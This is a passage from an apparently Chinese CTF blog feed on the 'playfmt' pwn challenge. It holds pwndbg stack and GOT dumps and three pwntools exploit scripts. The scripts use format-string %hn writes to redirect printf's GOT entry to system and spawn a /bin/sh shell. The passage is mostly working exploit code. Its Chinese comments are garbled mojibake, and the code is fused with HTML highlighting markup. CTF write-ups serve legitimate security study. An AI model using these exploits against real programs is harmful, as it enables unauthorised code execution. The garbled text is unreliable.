0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xcâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000â”‚ esp  0xffa077c0 â€”â–¸ 0x804a060 (buf) â—‚â€” 0x31313225 ('%211')01:0004â”‚      0xffa077c4 â€”â–¸ 0x8048640 â—‚â€” jno    0x80486b7 /* 'quit' */02:0008â”‚      0xffa077c8 â—‚â€” 0x403:000câ”‚      0xffa077cc â€”â–¸ 0x804857c (play+51) â—‚â€” add    esp, 0x1004:0010â”‚      0xffa077d0 â€”â–¸ 0x8048645 â—‚â€” cmp    eax, 0x3d3d3d3d05:0014â”‚      0xffa077d4 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db006:0018â”‚ ebp  0xffa077d8 â€”â–¸ 0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x007:001câ”‚      0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â€”â–¸ 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc08:0020â”‚      0xffa077e0 â€”â–¸ 0xf7eb0d60 (_IO_2_1_stdout_) â—‚â€” 0xfbad288709:0024â”‚      0xffa077e4 â—‚â€” 0x00a:0028â”‚      0xffa077e8 â€”â–¸ 0xffa077f8 â—‚â€” 0x00b:002câ”‚      0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d30c:0030â”‚      0xffa077f0 â€”â–¸ 0xf7eb03dc (__exit_funcs) â€”â–¸ 0xf7eb11e0 (initial) â—‚â€” 0x00d:0034â”‚      0xffa077f4 â€”â–¸ 0xffa07810 â—‚â€” 0x10e:0038â”‚      0xffa077f8 â—‚â€” 0x00f:003câ”‚      0xffa077fc â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1010:0040â”‚      0xffa07800 â—‚â€” 0x111:0044â”‚      0xffa07804 â€”â–¸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” 0x1b2db012:0048â”‚      0xffa07808 â—‚â€” 0x013:004câ”‚      0xffa0780c â€”â–¸ 0xf7d15276 (__libc_start_main+246) â—‚â€” add    esp, 0x1014:0050â”‚      0xffa07810 â—‚â€” 0x115:0054â”‚      0xffa07814 â€”â–¸ 0xffa078a4 â€”â–¸ 0xffa077dc â€”â–¸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) â—‚â€” 0xf7d37b3016:0058â”‚      0xffa07818 â€”â–¸ 0xffa078ac â€”â–¸ 0xffa077ec â€”â–¸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) â—‚â€” 0xc870f7d317:005câ”‚      0xffa0781c â—‚â€” 0x0... â†“pwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) â—‚â€” cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) â—‚â€” sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) â—‚â€” push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) â—‚â€” push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) â—‚â€” push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) â—‚â€” push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#ä½œè€…ï¼š23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ç”±äºebp2å·²ç»æŒ‡å‘äº†fmt_7ï¼Œæ‰€ä»¥ä¿®æ”¹åç§»é‡10å¤„çš„ebp2å³ä¿®æ”¹fmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''è¿™ä¸ªå¾ªç¯ç”¨äºä¿è¯æ‰€æœ‰çš„å­—èŠ‚éƒ½è¢«è¾“å‡ºï¼Œå› ä¸ºrecvï¼ˆï¼‰ä¸€æ¬¡æœ€å¤šåªèƒ½æ¥æ”¶0x1000ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦è¿›è¡Œå¤šæ¬¡recvï¼ˆï¼‰æ‰èƒ½ä¿è¯å…¨éƒ¨å­—èŠ‚éƒ½è¾“å‡ºä»¥ä¾¿è¿›è¡Œä¸‹é¢çš„æ“ä½œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²â€œ23r3fâ€æ¥ä½œæ ‡å¿—ï¼Œè¿”å›çš„å¤§é‡å­—ç¬¦ä¸²ä¸­å¦‚æœåŒ…å«äº†è¿™ä¸ªå­—ç¬¦ä¸²é‚£ä¹ˆè¯´æ˜ä¹‹å‰æ„é€ çš„%nå†™å…¥å·²ç»å®Œæˆ'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬æŠŠsystemçš„åœ°å€çš„å‰åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«å†™åˆ°fmt-7å’Œfmt-11ä¸­ï¼Œåœ¨å†™å…¥åä¸¤ä¸ªå­—èŠ‚çš„æ—¶å€™è¦æ³¨æ„å‡å»å‰é¢è¾“å…¥çš„(system_addr &amp;0xffff))ï¼Œè¿™æ˜¯å› ä¸º%nå†™å…¥æ“ä½œæ˜¯ç®—ç´¯ç§¯è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''è¿™ä¸ªæ—¶å€™è¾“å…¥å‚æ•°åˆ°æ ˆä¸­ï¼Œæœ¬æ¥ä¸‹ä¸€æ­¥ç¨‹åºä¼šè°ƒç”¨printfå‡½æ•°ï¼Œä½†æ˜¯æ­¤æ—¶printfå‡½æ•°çš„gotè¡¨å·²ç»è¢«ä¿®æ”¹ä¸ºsystemçš„åœ°å€äº†ï¼Œæ­¤æ—¶å°±ä¼šæ‰§è¡Œsystemå¹¶ä¸”ä»æ ˆä¸­å–bin/shå‚æ•°äºæ˜¯å°±è¿™æ ·getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">'%6$x'</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>p_ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#10</span>p_7 <span class="token operator">=</span> p_ebp2<span class="token number">-0xc</span><span class="token comment" spellcheck="true">#7</span>p_11 <span class="token operator">=</span> p_ebp2<span class="token operator">+</span><span class="token number">4</span><span class="token comment" spellcheck="true">#11</span>p_ebp1 <span class="token operator">=</span> p_ebp2<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#6</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_7<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_7</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_printf<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_7->p_printf</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>p_11<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%6$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_ebp2->p_11</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>p_printf<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%10$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#set p_11->p_printf+2</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'here\x00'</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>pay <span class="token operator">=</span> <span class="token string">"aaaa%7$s\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>cn<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>printf <span class="token operator">=</span> u32<span class="token punctuation">(</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>printf<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak printf</span>system <span class="token operator">=</span> printf<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span>pay <span class="token operator">=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%7$hn"</span> pay <span class="token operator">+=</span> <span class="token string">"%"</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"c%11$hn\x00"</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#hijack printf->system</span>cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    cn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"here\x00"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"here"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>cn<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æœ‰ç‚¹æ‡µï¼Œå¥½å¥½æ¶ˆåŒ–ã€‚</p><p>åŸæ¥å„å¤„çš„&amp;ffffï¼Œä¸å•å•æ˜¯ä¸ºäº†åŒ¹é…åé¢çš„%$hnè§£å¼•ç”¨å†™ä¸¤ä¸ªå­—èŠ‚ï¼Œè€Œæ˜¯ï¼Œè¿™ç§å†™çš„æ–¹å¼å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯å°†æ‰€æŒ‡å®šçš„å†…å­˜ç©ºé—´çš„å‰ä¸¤ä¸ªå­—èŠ‚æ¢æˆæˆ‘ä»¬è¦å†™çš„å€¼ã€‚</p><p>å¦‚<code>&quot;%&quot;+str(p_11&amp;0xffff)+&quot;c%6$hn\x00&quot;</code>ï¼Œåˆ™è¡¨ç¤ºå°†å‘æ ˆç©ºé—´åç§»é‡6çš„ä½ç½®çš„å‰ä¸¤ä¸ªå­—èŠ‚å†™æˆ<code>p_11&amp;0xffff</code>ï¼Œå³åŸæ•°æ®è‹¥ä¸º<code>0x12345678</code>ï¼Œç»è¿‡æ“ä½œåå˜ä¸ºäº†<code>0x12340000+p_11&amp;0xffff</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> äºŒè¿›åˆ¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ä½¿ç”¨Dockerè¿›è¡ŒPwné¢˜ç¯å¢ƒéƒ¨ç½²</title>
      <link href="/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
      <url>/2018/10/30/Pwn%E9%A2%98%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
      
